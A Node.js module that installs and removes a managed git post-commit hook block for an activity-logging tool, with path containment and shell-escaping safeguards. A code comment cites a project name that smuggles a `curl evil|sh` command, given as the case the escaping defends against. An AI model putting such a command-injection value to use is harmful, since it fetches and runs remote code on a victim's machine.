// SPDX-License-Identifier: Apache-2.0
// Git post-commit hook installation: a managed, idempotent block inside
// <gitdir>/hooks/post-commit that invokes `activity record` so every
// commit outside the task loop is registered retroactively. The block is
// delimited by sentinels; install never rewrites user hook content and
// uninstall removes only the managed block. The hook always exits 0 —
// activity logging must never break a commit.
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { err } from './errors.mjs';
import {
  decodeUtf8Strict, lstatOrNull, mkdirpSync, readFileLimited,
  writeFileExclusive,
} from './fsx.mjs';
import { resolveInside } from './paths.mjs';

const OPEN = '### scopegrain-activity >>>';
const CLOSE = '### scopegrain-activity <<<';
const MAX_HOOK_BYTES = 65536;
const MAX_GITFILE_BYTES = 8192;

// Resolve the hooks directory: <root>/.git may be a directory (normal
// repo) or a file (worktree/submodule) carrying a `gitdir:` pointer.
export function gitHooksDir(ctx) {
  const dotgit = resolveInside(ctx.projectRoot, '.git', '.git');
  const st = lstatOrNull(dotgit);
  if (!st) {
    throw err('NOT_FOUND', 'no .git entry — project is not a git worktree');
  }
  if (st.isSymbolicLink()) {
    throw err('INVALID_PATH', '.git is a link — refusing to follow');
  }
  if (st.isFile()) {
    const limited = readFileLimited(dotgit, MAX_GITFILE_BYTES);
    const text = decodeUtf8Strict(limited.content, '.git file');
    const m = /^gitdir:\s*(.+)$/m.exec(text);
    if (!m) {
      throw err('MALFORMED_JSON', '.git file lacks a gitdir: pointer');
    }
    const gitdir = path.resolve(ctx.projectRoot, m[1].trim());
    // Contain the gitdir pointer: a crafted `.git` file could otherwise
    // redirect hook writes outside the project root. Real worktrees
    // point at <main>/.git/worktrees/<name> — git reads hooks from the
    // common dir anyway, so install belongs at the main checkout where
    // .git is a directory.
    const root = path.resolve(ctx.projectRoot);
    if (gitdir !== root && !gitdir.startsWith(root + path.sep)) {
      throw err('INVALID_PATH',
        '.git gitdir: pointer escapes the project root; '
        + 'run hooks install at the main checkout');
    }
    return path.join(gitdir, 'hooks');
  }
  if (!st.isDirectory()) {
    throw err('INVALID_PATH', '.git is neither file nor directory');
  }
  return path.join(dotgit, 'hooks');
}

// POSIX single-quote escape: the only byte that can break out of a
// single-quoted segment is ' itself.
function sq(value) {
  return `'${String(value).replace(/'/g, `'\\''`)}'`;
}

function managedBlock(ctx, binAbs) {
  // The hook builds the input JSON with git itself (no shell escaping of
  // the subject) via an embedded node one-liner, then records it.
  // Paths are single-quoted, not double-quoted: a project named
  // `x";curl evil|sh;"` must not reach the shell unescaped.
  const bin = sq(binAbs.replace(/\\/g, '/'));
  const proj = sq(ctx.projectRoot.replace(/\\/g, '/'));
  return `${OPEN}
# Auto-registered by Scopegrain: every commit outside a task lifecycle
# is recorded as an activity task + progress entry. Never breaks commits.
SG_INPUT=$(git rev-parse --git-dir)/scopegrain-activity.json
node -e 'const {execSync}=require("child_process");const fs=require("fs");'\\
'const sha=execSync("git rev-parse HEAD").toString().trim();'\\
'const subj=execSync("git log -1 --format=%s").toString().trim();'\\
'const author=execSync("git log -1 --format=%an").toString().trim();'\\
'const files=execSync("git diff-tree --no-commit-id --name-only -r HEAD").toString().split("\\n").filter(Boolean);'\\
'fs.writeFileSync(process.argv[1], JSON.stringify({kind:"commit",ref:sha,author,title:"commit "+sha.slice(0,10)+": "+subj,summary:subj,files}));'\\
  "$SG_INPUT" 2>/dev/null || exit 0
node ${bin} activity record --project ${proj} --input "$SG_INPUT" --apply >/dev/null 2>&1 || true
rm -f "$SG_INPUT"
${CLOSE}`;
}

function readHook(hooksDir) {
  const file = path.join(hooksDir, 'post-commit');
  const st = lstatOrNull(file);
  if (!st) return { file, content: null };
  if (st.isSymbolicLink() || !st.isFile()) {
    throw err('INVALID_PATH', 'post-commit is not a regular file');
  }
  const limited = readFileLimited(file, MAX_HOOK_BYTES);
  if (limited.exceeded) {
    throw err('DOCUMENT_TOO_LARGE', 'post-commit exceeds 64KiB');
  }
  return { file, content: decodeUtf8Strict(limited.content, 'post-commit') };
}

export function planHooks(ctx, { binAbs }) {
  const hooksDir = gitHooksDir(ctx);
  const { file, content } = readHook(hooksDir);
  const hasBlock = content !== null && content.includes(OPEN);
  let next;
  if (hasBlock) {
    next = null; // idempotent: already installed
  } else if (content === null) {
    next = `#!/bin/sh\n${managedBlock(ctx, binAbs)}\n`;
  } else {
    const sep = content.endsWith('\n') ? '' : '\n';
    next = `${content}${sep}\n${managedBlock(ctx, binAbs)}\n`;
  }
  return {
    file,
    hooksDir,
    state: hasBlock ? 'installed'
      : content === null ? 'create' : 'append',
    nextContent: next,
  };
}

export function installHooks(ctx, { binAbs }) {
  const plan = planHooks(ctx, { binAbs });
  if (plan.nextContent === null) {
    return { ...plan, applied: false, reason: 'already-installed' };
  }
  mkdirpSync(plan.hooksDir);
  // Random exclusive tmp name: two concurrent installs must not mix
  // content through a shared fixed-name file.
  const tmp = `${plan.file}.tmp-${crypto.randomBytes(6).toString('hex')}`;
  writeFileExclusive(tmp, plan.nextContent);
  fs.renameSync(tmp, plan.file); // same-dir atomic replace
  try {
    fs.chmodSync(plan.file, 0o755);
  } catch {
    // Windows has no exec bits; git-for-windows runs hooks regardless.
  }
  return { ...plan, applied: true, nextContent: undefined };
}

export function uninstallHooks(ctx) {
  const hooksDir = gitHooksDir(ctx);
  const { file, content } = readHook(hooksDir);
  if (content === null || !content.includes(OPEN)) {
    return { file, applied: false, reason: 'not-installed' };
  }
  const lines = content.split('\n');
  const out = [];
  let skip = false;
  for (const line of lines) {
    if (line.startsWith(OPEN)) {
      skip = true;
      // Drop the blank separator line that install inserted before OPEN.
      if (out.length && out[out.length - 1].trim() === '') out.pop();
      continue;
    }
    if (line.startsWith(CLOSE)) { skip = false; continue; }
    if (!skip) out.push(line);
  }
  const next = out.join('\n').replace(/\n{3,}/g, '\n\n').trim() === ''
    ? null
    : out.join('\n');
  const tmp = `${file}.scopegrain-tmp`;
  if (next === null) {
    fs.unlinkSync(file); // the hook was only our block
  } else {
    fs.writeFileSync(tmp, next, 'utf8');
    fs.renameSync(tmp, file);
  }
  return { file, applied: true };
}
